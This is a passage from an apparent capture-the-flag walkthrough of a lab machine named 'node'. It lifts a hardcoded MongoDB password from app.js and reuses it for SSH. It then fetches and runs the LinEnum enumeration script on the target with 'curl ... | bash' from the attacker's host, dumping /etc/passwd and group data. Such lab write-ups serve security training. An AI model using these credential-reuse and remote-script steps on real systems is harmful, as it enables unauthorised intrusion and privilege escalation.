        │   │   │   ├── crc16_ccitt.js
        │   │   │   ├── crc16.js
        │   │   │   ├── crc16_kermit.js
        │   │   │   ├── crc16_modbus.js
        │   │   │   ├── crc16_xmodem.js
        │   │   │   ├── crc1.js
        │   │   │   ├── crc24.js
        │   │   │   ├── crc32.js
        │   │   │   ├── crc8_1wire.js
        │   │   │   ├── crc8.js
        │   │   │   ├── create_buffer.js
        │   │   │   ├── define_crc.js
        │   │   │   └── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── debug
        │   │   ├── CHANGELOG.md
        │   │   ├── component.json
        │   │   ├── karma.conf.js
        │   │   ├── LICENSE
        │   │   ├── Makefile
        │   │   ├── node.js
        │   │   ├── package.json
        │   │   ├── README.md
        │   │   └── src
        │   │       ├── browser.js
        │   │       ├── debug.js
        │   │       ├── index.js
        │   │       └── node.js
        │   ├── depd
        │   │   ├── History.md
        │   │   ├── index.js
        │   │   ├── lib
        │   │   │   ├── browser
        │   │   │   │   └── index.js
        │   │   │   └── compat
        │   │   │       ├── callsite-tostring.js
        │   │   │       ├── event-listener-count.js
        │   │   │       └── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── Readme.md
        │   ├── destroy
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── ee-first
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── encodeurl
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── es6-promise
        │   │   ├── CHANGELOG.md
        │   │   ├── dist
        │   │   │   ├── es6-promise.js
        │   │   │   └── es6-promise.min.js
        │   │   ├── lib
        │   │   │   ├── es6-promise
        │   │   │   │   ├── asap.js
        │   │   │   │   ├── enumerator.js
        │   │   │   │   ├── -internal.js
        │   │   │   │   ├── polyfill.js
        │   │   │   │   ├── promise
        │   │   │   │   │   ├── all.js
        │   │   │   │   │   ├── race.js
        │   │   │   │   │   ├── reject.js
        │   │   │   │   │   └── resolve.js
        │   │   │   │   ├── promise.js
        │   │   │   │   ├── then.js
        │   │   │   │   └── utils.js
        │   │   │   └── es6-promise.umd.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── escape-html
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── Readme.md
        │   ├── etag
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── express
        │   │   ├── History.md
        │   │   ├── index.js
        │   │   ├── lib
        │   │   │   ├── application.js
        │   │   │   ├── express.js
        │   │   │   ├── middleware
        │   │   │   │   ├── init.js
        │   │   │   │   └── query.js
        │   │   │   ├── request.js
        │   │   │   ├── response.js
        │   │   │   ├── router
        │   │   │   │   ├── index.js
        │   │   │   │   ├── layer.js
        │   │   │   │   └── route.js
        │   │   │   ├── utils.js
        │   │   │   └── view.js
        │   │   ├── LICENSE
        │   │   ├── node_modules
        │   │   │   ├── debug
        │   │   │   │   ├── CHANGELOG.md
        │   │   │   │   ├── component.json
        │   │   │   │   ├── karma.conf.js
        │   │   │   │   ├── LICENSE
        │   │   │   │   ├── Makefile
        │   │   │   │   ├── node.js
        │   │   │   │   ├── package.json
        │   │   │   │   ├── README.md
        │   │   │   │   └── src
        │   │   │   │       ├── browser.js
        │   │   │   │       ├── debug.js
        │   │   │   │       ├── index.js
        │   │   │   │       └── node.js
        │   │   │   └── qs
        │   │   │       ├── CHANGELOG.md
        │   │   │       ├── dist
        │   │   │       │   └── qs.js
        │   │   │       ├── lib
        │   │   │       │   ├── formats.js
        │   │   │       │   ├── index.js
        │   │   │       │   ├── parse.js
        │   │   │       │   ├── stringify.js
        │   │   │       │   └── utils.js
        │   │   │       ├── LICENSE
        │   │   │       ├── package.json
        │   │   │       ├── README.md
        │   │   │       └── test
        │   │   │           ├── index.js
        │   │   │           ├── parse.js
        │   │   │           ├── stringify.js
        │   │   │           └── utils.js
        │   │   ├── package.json
        │   │   └── Readme.md
        │   ├── express-session
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── node_modules
        │   │   │   └── debug
        │   │   │       ├── CHANGELOG.md
        │   │   │       ├── component.json
        │   │   │       ├── karma.conf.js
        │   │   │       ├── LICENSE
        │   │   │       ├── Makefile
        │   │   │       ├── node.js
        │   │   │       ├── package.json
        │   │   │       ├── README.md
        │   │   │       └── src
        │   │   │           ├── browser.js
        │   │   │           ├── debug.js
        │   │   │           ├── index.js
        │   │   │           └── node.js
        │   │   ├── package.json
        │   │   ├── README.md
        │   │   └── session
        │   │       ├── cookie.js
        │   │       ├── memory.js
        │   │       ├── session.js
        │   │       └── store.js
        │   ├── finalhandler
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── node_modules
        │   │   │   └── debug
        │   │   │       ├── CHANGELOG.md
        │   │   │       ├── component.json
        │   │   │       ├── karma.conf.js
        │   │   │       ├── LICENSE
        │   │   │       ├── Makefile
        │   │   │       ├── node.js
        │   │   │       ├── package.json
        │   │   │       ├── README.md
        │   │   │       └── src
        │   │   │           ├── browser.js
        │   │   │           ├── debug.js
        │   │   │           ├── index.js
        │   │   │           └── node.js
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── forwarded
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── fresh
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── http-errors
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── iconv-lite
        │   │   ├── Changelog.md
        │   │   ├── encodings
        │   │   │   ├── dbcs-codec.js
        │   │   │   ├── dbcs-data.js
        │   │   │   ├── index.js
        │   │   │   ├── internal.js
        │   │   │   ├── sbcs-codec.js
        │   │   │   ├── sbcs-data-generated.js
        │   │   │   ├── sbcs-data.js
        │   │   │   ├── tables
        │   │   │   │   ├── big5-added.json
        │   │   │   │   ├── cp936.json
        │   │   │   │   ├── cp949.json
        │   │   │   │   ├── cp950.json
        │   │   │   │   ├── eucjp.json
        │   │   │   │   ├── gb18030-ranges.json
        │   │   │   │   ├── gbk-added.json
        │   │   │   │   └── shiftjis.json
        │   │   │   ├── utf16.js
        │   │   │   └── utf7.js
        │   │   ├── lib
        │   │   │   ├── bom-handling.js
        │   │   │   ├── extend-node.js
        │   │   │   ├── index.d.ts
        │   │   │   ├── index.js
        │   │   │   └── streams.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── inherits
        │   │   ├── inherits_browser.js
        │   │   ├── inherits.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── ipaddr.js
        │   │   ├── bower.json
        │   │   ├── Cakefile
        │   │   ├── ipaddr.min.js
        │   │   ├── lib
        │   │   │   └── ipaddr.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   ├── README.md
        │   │   ├── src
        │   │   │   └── ipaddr.coffee
        │   │   └── test
        │   │       └── ipaddr.test.coffee
        │   ├── isarray
        │   │   ├── component.json
        │   │   ├── index.js
        │   │   ├── Makefile
        │   │   ├── package.json
        │   │   ├── README.md
        │   │   └── test.js
        │   ├── media-typer
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── merge-descriptors
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── methods
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── mime
        │   │   ├── build
        │   │   │   ├── build.js
        │   │   │   └── test.js
        │   │   ├── cli.js
        │   │   ├── LICENSE
        │   │   ├── mime.js
        │   │   ├── package.json
        │   │   ├── README.md
        │   │   └── types.json
        │   ├── mime-db
        │   │   ├── db.json
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── mime-types
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── mongodb
        │   │   ├── boot_auth.js
        │   │   ├── conf.json
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── insert_bench.js
        │   │   ├── lib
        │   │   │   ├── admin.js
        │   │   │   ├── aggregation_cursor.js
        │   │   │   ├── apm.js
        │   │   │   ├── authenticate.js
        │   │   │   ├── bulk
        │   │   │   │   ├── common.js
        │   │   │   │   ├── ordered.js
        │   │   │   │   └── unordered.js
        │   │   │   ├── collection.js
        │   │   │   ├── command_cursor.js
        │   │   │   ├── cursor.js
        │   │   │   ├── db.js
        │   │   │   ├── gridfs
        │   │   │   │   ├── chunk.js
        │   │   │   │   └── grid_store.js
        │   │   │   ├── gridfs-stream
        │   │   │   │   ├── download.js
        │   │   │   │   ├── index.js
        │   │   │   │   └── upload.js
        │   │   │   ├── metadata.js
        │   │   │   ├── mongo_client.js
        │   │   │   ├── mongos.js
        │   │   │   ├── read_preference.js
        │   │   │   ├── replset.js
        │   │   │   ├── server.js
        │   │   │   ├── topology_base.js
        │   │   │   ├── url_parser.js
        │   │   │   └── utils.js
        │   │   ├── LICENSE
        │   │   ├── Makefile
        │   │   ├── package.json
        │   │   ├── README.md
        │   │   ├── THIRD-PARTY-NOTICES
        │   │   └── yarn.lock
        │   ├── mongodb-core
        │   │   ├── conf.json
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── lib
        │   │   │   ├── auth
        │   │   │   │   ├── gssapi.js
        │   │   │   │   ├── mongocr.js
        │   │   │   │   ├── plain.js
        │   │   │   │   ├── scram.js
        │   │   │   │   ├── sspi.js
        │   │   │   │   └── x509.js
        │   │   │   ├── connection
        │   │   │   │   ├── command_result.js
        │   │   │   │   ├── commands.js
        │   │   │   │   ├── connection.js
        │   │   │   │   ├── logger.js
        │   │   │   │   ├── pool.js
        │   │   │   │   └── utils.js
        │   │   │   ├── cursor.js
        │   │   │   ├── error.js
        │   │   │   ├── tools
        │   │   │   │   └── smoke_plugin.js
        │   │   │   ├── topologies
        │   │   │   │   ├── mongos.js
        │   │   │   │   ├── read_preference.js
        │   │   │   │   ├── replset.js
        │   │   │   │   ├── replset_state.js
        │   │   │   │   ├── server.js
        │   │   │   │   └── shared.js
        │   │   │   ├── utils.js
        │   │   │   └── wireprotocol
        │   │   │       ├── 2_4_support.js
        │   │   │       ├── 2_6_support.js
        │   │   │       ├── 3_2_support.js
        │   │   │       ├── commands.js
        │   │   │       └── shared.js
        │   │   ├── LICENSE
        │   │   ├── Makefile
        │   │   ├── package.json
        │   │   ├── README.md
        │   │   ├── test1.js
        │   │   ├── TESTING.md
        │   │   ├── test.js
        │   │   └── THIRD-PARTY-NOTICES
        │   ├── ms
        │   │   ├── index.js
        │   │   ├── license.md
        │   │   ├── package.json
        │   │   └── readme.md
        │   ├── negotiator
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── lib
        │   │   │   ├── charset.js
        │   │   │   ├── encoding.js
        │   │   │   ├── language.js
        │   │   │   └── mediaType.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── on-finished
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── on-headers
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── parseurl
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── path-to-regexp
        │   │   ├── History.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── Readme.md
        │   ├── process-nextick-args
        │   │   ├── index.js
        │   │   ├── license.md
        │   │   ├── package.json
        │   │   ├── readme.md
        │   │   └── test.js
        │   ├── proxy-addr
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── qs
        │   │   ├── CHANGELOG.md
        │   │   ├── dist
        │   │   │   └── qs.js
        │   │   ├── lib
        │   │   │   ├── formats.js
        │   │   │   ├── index.js
        │   │   │   ├── parse.js
        │   │   │   ├── stringify.js
        │   │   │   └── utils.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   ├── README.md
        │   │   └── test
        │   │       ├── index.js
        │   │       ├── parse.js
        │   │       ├── stringify.js
        │   │       └── utils.js
        │   ├── random-bytes
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── range-parser
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── raw-body
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── readable-stream
        │   │   ├── CONTRIBUTING.md
        │   │   ├── doc
        │   │   │   └── wg-meetings
        │   │   │       └── 2015-01-30.md
        │   │   ├── duplex-browser.js
        │   │   ├── duplex.js
        │   │   ├── GOVERNANCE.md
        │   │   ├── lib
        │   │   │   ├── internal
        │   │   │   │   └── streams
        │   │   │   │       └── BufferList.js
        │   │   │   ├── _stream_duplex.js
        │   │   │   ├── _stream_passthrough.js
        │   │   │   ├── _stream_readable.js
        │   │   │   ├── _stream_transform.js
        │   │   │   └── _stream_writable.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   ├── passthrough.js
        │   │   ├── readable-browser.js
        │   │   ├── readable.js
        │   │   ├── README.md
        │   │   ├── transform.js
        │   │   ├── writable-browser.js
        │   │   └── writable.js
        │   ├── require_optional
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   ├── README.md
        │   │   └── test
        │   │       ├── nestedTest
        │   │       │   ├── index.js
        │   │       │   └── package.json
        │   │       └── require_optional_tests.js
        │   ├── resolve-from
        │   │   ├── index.js
        │   │   ├── license
        │   │   ├── package.json
        │   │   └── readme.md
        │   ├── safe-buffer
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   ├── README.md
        │   │   └── test.js
        │   ├── semver
        │   │   ├── bin
        │   │   │   └── semver
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   ├── range.bnf
        │   │   ├── README.md
        │   │   └── semver.js
        │   ├── send
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── node_modules
        │   │   │   └── debug
        │   │   │       ├── CHANGELOG.md
        │   │   │       ├── component.json
        │   │   │       ├── karma.conf.js
        │   │   │       ├── LICENSE
        │   │   │       ├── Makefile
        │   │   │       ├── node.js
        │   │   │       ├── package.json
        │   │   │       ├── README.md
        │   │   │       └── src
        │   │   │           ├── browser.js
        │   │   │           ├── debug.js
        │   │   │           ├── index.js
        │   │   │           └── node.js
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── serve-static
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── setprototypeof
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── statuses
        │   │   ├── codes.json
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── string_decoder
        │   │   ├── lib
        │   │   │   └── string_decoder.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── type-is
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── uid-safe
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── unpipe
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── util-deprecate
        │   │   ├── browser.js
        │   │   ├── History.md
        │   │   ├── LICENSE
        │   │   ├── node.js
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── utils-merge
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   └── vary
        │       ├── HISTORY.md
        │       ├── index.js
        │       ├── LICENSE
        │       ├── package.json
        │       └── README.md
        ├── package.json
        ├── package-lock.json
        └── static
            ├── assets
            │   ├── css
            │   │   ├── app.css
            │   │   ├── freelancer.css
            │   │   └── freelancer.min.css
            │   └── js
            │       ├── app
            │       │   ├── app.js
            │       │   └── controllers
            │       │       ├── admin.js
            │       │       ├── home.js
            │       │       ├── login.js
            │       │       └── profile.js
            │       └── misc
            │           └── freelancer.min.js
            ├── partials
            │   ├── admin.html
            │   ├── home.html
            │   ├── login.html
            │   └── profile.html
            ├── uploads
            │   ├── mark.jpg
            │   ├── myP14ceAdm1nAcc0uNT.jpg
            │   ├── rastating.jpg
            │   └── tom.jpg
            └── vendor
                ├── angular
                │   ├── angular.min.js
                │   └── angular-route.min.js
                ├── bootstrap
                │   ├── css
                │   │   ├── bootstrap.css
                │   │   └── bootstrap.min.css
                │   ├── fonts
                │   │   ├── glyphicons-halflings-regular.eot
                │   │   ├── glyphicons-halflings-regular.svg
                │   │   ├── glyphicons-halflings-regular.ttf
                │   │   ├── glyphicons-halflings-regular.woff
                │   │   └── glyphicons-halflings-regular.woff2
                │   └── js
                │       ├── bootstrap.js
                │       └── bootstrap.min.js
                ├── font-awesome
                │   ├── css
                │   │   ├── font-awesome.css
                │   │   └── font-awesome.min.css
                │   ├── fonts
                │   │   ├── FontAwesome.otf
                │   │   ├── fontawesome-webfont.eot
                │   │   ├── fontawesome-webfont.svg
                │   │   ├── fontawesome-webfont.ttf
                │   │   ├── fontawesome-webfont.woff
                │   │   └── fontawesome-webfont.woff2
                │   ├── less
                │   │   ├── animated.less
                │   │   ├── bordered-pulled.less
                │   │   ├── core.less
                │   │   ├── fixed-width.less
                │   │   ├── font-awesome.less
                │   │   ├── icons.less
                │   │   ├── larger.less
                │   │   ├── list.less
                │   │   ├── mixins.less
                │   │   ├── path.less
                │   │   ├── rotated-flipped.less
                │   │   ├── screen-reader.less
                │   │   ├── stacked.less
                │   │   └── variables.less
                │   └── scss
                │       ├── _animated.scss
                │       ├── _bordered-pulled.scss
                │       ├── _core.scss
                │       ├── _fixed-width.scss
                │       ├── font-awesome.scss
                │       ├── _icons.scss
                │       ├── _larger.scss
                │       ├── _list.scss
                │       ├── _mixins.scss
                │       ├── _path.scss
                │       ├── _rotated-flipped.scss
                │       ├── _screen-reader.scss
                │       ├── _stacked.scss
                │       └── _variables.scss
                └── jquery
                    ├── jquery.js
                    └── jquery.min.js

156 directories, 657 files
root@kali:~/node/var#
```

###### SSH Access using MongoDB password

```sh
root@kali:~/node/var/www/myplace# vim app.js
```

![](images/15.png)

```sh
root@kali:~/node/var/www/myplace# head app.js -n 13

const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';

root@kali:~/node/var/www/myplace#
```

```sh
root@kali:~/node/var/www/myplace# ssh mark@10.10.10.58
The authenticity of host '10.10.10.58 (10.10.10.58)' can't be established.
ECDSA key fingerprint is SHA256:I0Y7EMtrkyc9Z/92jdhXQen2Y8Lar/oqcDNLHn28Hbs.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.58' (ECDSA) to the list of known hosts.
mark@10.10.10.58's password:

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

              .-.
        .-'``(|||)
     ,`\ \    `-`.                 88                         88
    /   \ '``-.   `                88                         88
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888'
        `-..-(   )
              `-`




The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3
mark@node:~$
```

###### Privilege Escalation

```sh
root@kali:~/node# wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
--2018-06-04 13:31:18--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.52.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.52.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43488 (42K) [text/plain]
Saving to: ‘LinEnum.sh’

LinEnum.sh                                         100%[================================================================================================================>]  42.47K  --.-KB/s    in 0.08s

2018-06-04 13:31:19 (503 KB/s) - ‘LinEnum.sh’ saved [43488/43488]

root@kali:~/node#
```

```sh
root@kali:~/node# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.58 - - [04/Jun/2018 13:31:54] "GET /LinEnum.sh HTTP/1.1" 200 -
```

```sh
mark@node:~$ curl http://10.10.14.16:8000/LinEnum.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 43488  100 43488    0     0  39664      0  0:00:01  0:00:01 --:--:-- 39678

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.9

[-] Debug Info
[+] Thorough tests = Disabled (SUID/GUID checks will not be perfomed!)


Scan started at:
Mon  4 Jun 18:31:31 BST 2018


### SYSTEM ##############################################
[-] Kernel information:
Linux node 4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.4.0-93-generic (buildd@lgw01-03) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.3 LTS"
NAME="Ubuntu"
VERSION="16.04.3 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.3 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial


[-] Hostname:
node


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1001(mark) gid=1001(mark) groups=1001(mark)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             tty1                      Thu Jan 18 14:39:42 +0000 2018
tom              pts/0    10.2.0.1         Sun Sep  3 16:03:08 +0100 2017
mark             pts/0    10.10.14.16      Mon Jun  4 18:28:32 +0100 2018


[-] Who else is logged on:
 18:31:31 up 15:04,  1 user,  load average: 0.08, 0.02, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
mark     pts/0    10.10.14.16      18:28    3.00s  0.07s  0.00s bash


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root),1002(admin)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
uid=111(mongodb) gid=65534(nogroup) groups=65534(nogroup),117(mongodb)
uid=1001(mark) gid=1001(mark) groups=1001(mark)


[-] It looks like we have some admin users:
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
tom:x:1000:1000:tom,,,:/home/tom:/bin/bash
mongodb:x:111:65534::/home/mongodb:/bin/false
mark:x:1001:1001:Mark,,,:/home/mark:/bin/bash


[-] Super user account(s):
root


[-] Are permissions on /home directories lax:
total 20K
drwxr-xr-x  5 root root 4.0K Aug 31  2017 .
drwxr-xr-x 25 root root 4.0K Sep  2  2017 ..
drwxr-xr-x  2 root root 4.0K Aug 31  2017 frank
drwxr-xr-x  3 root root 4.0K Sep  3  2017 mark
drwxr-xr-x  6 root root 4.0K Sep  3  2017 tom


### ENVIRONMENTAL #######################################
[-] Environment information:
XDG_SESSION_ID=18
SHELL=/bin/bash
TERM=xterm-256color
SSH_CLIENT=10.10.14.16 52860 22
SSH_TTY=/dev/pts/0
USER=mark
PATH=/home/mark/bin:/home/mark/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
